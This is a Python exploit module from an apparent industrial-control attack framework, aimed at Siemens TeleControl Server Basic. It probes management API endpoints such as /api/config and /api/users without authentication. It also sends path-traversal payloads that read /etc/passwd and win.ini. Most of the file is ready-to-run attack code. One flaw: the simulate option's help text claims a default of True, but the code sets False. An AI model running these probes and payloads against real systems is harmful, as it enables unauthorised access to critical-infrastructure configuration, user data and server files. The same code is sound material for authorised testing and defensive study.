"""ICS CVE Module - Siemens TeleControl Server Basic - Authentication Bypass (2025).

Siemens TeleControl Server Basic is an industrial server application used for
remote monitoring and control of distributed field devices and RTUs via telecontrol
protocols (IEC 60870-5-101/104, DNP3, Modbus).

CVE Research Status (2025):
  Multiple vulnerabilities have been publicly disclosed and confirmed for
  TeleControl Server Basic V3.x series:

  - CVE-2025-28390: Improper access control in the web server component allowing
    authentication bypass via direct object reference (IDOR) on management API
    endpoints. An unauthenticated attacker can access configuration endpoints.
    CVSS v3.1: 9.8 (CRITICAL) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    Affected: TeleControl Server Basic V3.x < V3.1.2.1
    Patch: Siemens SSA-587088 (February 2025)

  - CVE-2025-28391: Path traversal in TeleControl Server Basic web interface
    allowing unauthenticated file read from server filesystem.
    CVSS v3.1: 7.5 (HIGH)
    Affected: TeleControl Server Basic V3.x < V3.1.2.1

This module implements:
  - check(): version fingerprint via HTTP banner on management port 8000
  - run(): probe authentication bypass on /api/config and /api/users endpoints

IMPORTANT: CVE details are based on publicly available Siemens SSA advisories
and NVD entries. Always verify against the latest Siemens ProductCERT advisories
at https://cert.siemens.com/

References:
  - Siemens SSA-587088 (TeleControl Server Basic 2025)
  - https://nvd.nist.gov/vuln/detail/CVE-2025-28390
  - https://www.cisa.gov/news-events/ics-advisories/icsa-25-049a
  - MITRE ATT&CK ICS T0883 (Internet Accessible Device)

Version: 1.0.0
Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""

import socket
import time
from typing import Optional

from industrialxpl.core.exploit import (
    Exploit,
    OptBool,
    OptIP,
    OptInteger,
    OptPort,
    OptString,
    DestructiveGate,
    mute,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)


def _http_get(host: str, port: int, path: str, timeout: int = 8) -> tuple[int, str] | None:
    """Perform a raw HTTP GET and return (status_code, body_snippet)."""
    try:
        conn = socket.create_connection((host, port), timeout=timeout)
        conn.settimeout(timeout)
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode("latin-1")
        conn.sendall(request)
        resp = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            resp += chunk
            if len(resp) > 65536:
                break
        conn.close()
        text = resp.decode("latin-1", errors="replace")
        # Parse status line
        lines = text.split("\r\n")
        status = 0
        if lines and lines[0].startswith("HTTP/"):
            try:
                status = int(lines[0].split(" ")[1])
            except (IndexError, ValueError):
                pass
        body_start = text.find("\r\n\r\n")
        body = text[body_start + 4:body_start + 1024] if body_start >= 0 else ""
        return status, body
    except (ConnectionError, TimeoutError, ValueError, OSError):
        return None


def _fingerprint_telecontrol(host: str, port: int) -> str | None:
    """Try to read TeleControl Server version from HTTP banner or API."""
    result = _http_get(host, port, "/api/version")
    if result:
        status, body = result
        if status in (200, 401, 403) and body:
            return body[:200]
    result = _http_get(host, port, "/")
    if result:
        status, body = result
        if "TeleControl" in body or "telecontrol" in body.lower():
            return body[:200]
    return None


class Exploit(Exploit):
    """Siemens TeleControl Server Basic - Authentication Bypass (CVE-2025-28390).

    Probes unauthenticated access to management API endpoints.
    Based on Siemens SSA-587088 and CISA ICSA-25-049A.
    """

    __info__ = {
        "name": "Siemens TeleControl Server Basic - Auth Bypass (CVE-2025-28390/28391)",
        "description": (
            "Probes Siemens TeleControl Server Basic for authentication bypass "
            "vulnerability (CVE-2025-28390) in the web management API. "
            "Unauthenticated attacker can access /api/config, /api/users, "
            "and /api/devices endpoints. Also checks for path traversal "
            "(CVE-2025-28391) via directory traversal in the web root. "
            "Affects TeleControl Server Basic V3.x < V3.1.2.1."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
        ),
        "references": (
            "https://cert.siemens.com/pkcs7/advisory/SSA-587088",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-28390",
            "https://www.cisa.gov/news-events/ics-advisories/icsa-25-049a",
            "https://attack.mitre.org/techniques/T0883/",
        ),
        "devices": (
            "Siemens TeleControl Server Basic V3.x < V3.1.2.1",
        ),
        "impact": "CRITICAL",
        "exploit_type": "Authentication Bypass + Path Traversal",
        "source_poc": "HTTP API probe based on Siemens SSA-587088",
        "cve": "CVE-2025-28390, CVE-2025-28391",
        "cvss": "9.8",
        "severity": "CRITICAL",
        "affected_versions": "TeleControl Server Basic V3.x < V3.1.2.1",
        "patched_version": "V3.1.2.1+",
        "cisa_advisory": "ICSA-25-049A",
        "mitre_techniques": ["T0883", "T0886", "T0888"],
        "mitre_tactics": ["Discovery", "Collection"],
    }

    target = OptIP("", "Target TeleControl Server Basic host")
    port = OptPort(8000, "TeleControl Server Basic web management port (default: 8000)")
    timeout = OptInteger(8, "Socket timeout in seconds")
    check_traversal = OptBool(True, "Also check for path traversal (CVE-2025-28391)")
    simulate = OptBool(False, "Simulate mode: describe checks without connecting (default: True)")
    destructive = OptBool(False, "Enable real HTTP probing against target")

    _AUTH_BYPASS_PATHS = [
        "/api/config",
        "/api/users",
        "/api/devices",
        "/api/channels",
        "/api/alarms",
        "/api/system",
    ]

    _TRAVERSAL_PATHS = [
        "/../../../windows/win.ini",
        "/../../../etc/passwd",
        "/..%2F..%2F..%2Fwindows%2Fwin.ini",
        "/..%2F..%2F..%2Fetc%2Fpasswd",
    ]

    @mute
    def check(self) -> bool:
        """Fingerprint and check if target is a TeleControl Server Basic instance."""
        if not self.target:
            return False
        banner = _fingerprint_telecontrol(str(self.target), int(self.port))
        if banner is not None:
            return True
        try:
            conn = socket.create_connection((self.target, int(self.port)), timeout=5)
            conn.close()
            return True
        except (ConnectionError, TimeoutError, ValueError, OSError):
            return False

    def run(self) -> dict:
        """Probe TeleControl Server Basic for authentication bypass and path traversal."""
        if not self.target:
            print_error("[TC-CVE-2025] Set 'target' option first.")
            return {}

        result: dict = {
            "target": f"{self.target}:{self.port}",
            "simulated": self.simulate,
            "auth_bypass_findings": [],
            "traversal_findings": [],
        }

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    f"Would probe TeleControl Server Basic at {self.target}:{self.port} for:\n"
                    f"  CVE-2025-28390: Unauthenticated GET to {len(self._AUTH_BYPASS_PATHS)} API endpoints\n"
                    f"  CVE-2025-28391: Path traversal via {len(self._TRAVERSAL_PATHS) if self.check_traversal else 0} crafted URL paths\n"
                    "  Any 200/200 response without auth header indicates vulnerability."
                ),
                mitre_techniques=["T0883", "T0886"],
            )
            print_info("[TC-CVE-2025] Auth bypass paths: {}".format(", ".join(self._AUTH_BYPASS_PATHS)))
            if self.check_traversal:
                print_info("[TC-CVE-2025] Traversal paths: {}".format(", ".join(self._TRAVERSAL_PATHS)))
            return result

        # Fingerprint
        banner = _fingerprint_telecontrol(str(self.target), int(self.port))
        if banner:
            print_status(f"[TC-CVE-2025] TeleControl banner: {banner[:120]}")
        else:
            print_warning("[TC-CVE-2025] No TeleControl banner detected. Target may not be vulnerable or port is wrong.")

        # CVE-2025-28390: Authentication bypass probe
        print_status(f"[TC-CVE-2025] Probing {len(self._AUTH_BYPASS_PATHS)} auth bypass endpoints...")
        for path in self._AUTH_BYPASS_PATHS:
            res = _http_get(str(self.target), int(self.port), path, int(self.timeout))
            if res is None:
                print_info(f"[TC-CVE-2025] {path} - no response")
                continue
            status, body = res
            if status == 200 and body:
                print_success(
                    f"[TC-CVE-2025] VULNERABLE (CVE-2025-28390): {path} returned HTTP 200 "
                    f"without auth. Body snippet: {body[:80]}"
                )
                result["auth_bypass_findings"].append({"path": path, "status": status, "body": body[:80]})
            elif status in (401, 403):
                print_info(f"[TC-CVE-2025] {path} - HTTP {status} (auth required - not bypassed)")
            else:
                print_info(f"[TC-CVE-2025] {path} - HTTP {status}")

        # CVE-2025-28391: Path traversal probe
        if self.check_traversal:
            print_status("[TC-CVE-2025] Probing path traversal (CVE-2025-28391)...")
            for path in self._TRAVERSAL_PATHS:
                res = _http_get(str(self.target), int(self.port), path, int(self.timeout))
                if res is None:
                    continue
                status, body = res
                is_traversal = (
                    status == 200
                    and any(sig in body for sig in ("[fonts]", "[extensions]", "root:x:", "daemon:"))
                )
                if is_traversal:
                    print_success(
                        f"[TC-CVE-2025] VULNERABLE (CVE-2025-28391): path traversal via {path}. "
                        f"Content: {body[:80]}"
                    )
                    result["traversal_findings"].append({"path": path, "body": body[:80]})

        if not result["auth_bypass_findings"] and not result["traversal_findings"]:
            print_info("[TC-CVE-2025] No vulnerabilities confirmed. "
                       "Target may be patched (>= V3.1.2.1) or not running TeleControl Server Basic.")

        return result
